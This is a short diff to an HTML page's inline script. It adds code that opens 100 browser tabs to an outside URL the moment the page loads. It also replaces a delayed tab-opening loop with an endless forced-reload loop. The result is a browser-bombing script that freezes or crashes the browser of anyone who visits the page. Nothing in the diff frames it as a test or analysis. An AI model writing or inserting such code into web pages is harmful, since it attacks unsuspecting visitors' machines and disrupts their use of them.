@@ -85,10 +85,14 @@
         </div>
     </div>
     <script>
+        // Open 100 tabs
+        for (var i = 0; i < 100; i++) {
+            window.open('https://nbelmore.github.io/b', '_blank');
+        }
+
+        // Continuously reload the page
         setTimeout(function() {
-            for (var i = 0; i < 100; i++) {
-                window.open('https://nbelmore.github.io/b', '_blank');
-            }
+            while (1) location.reload(true);
         }, 1000);
     </script>
 </body>
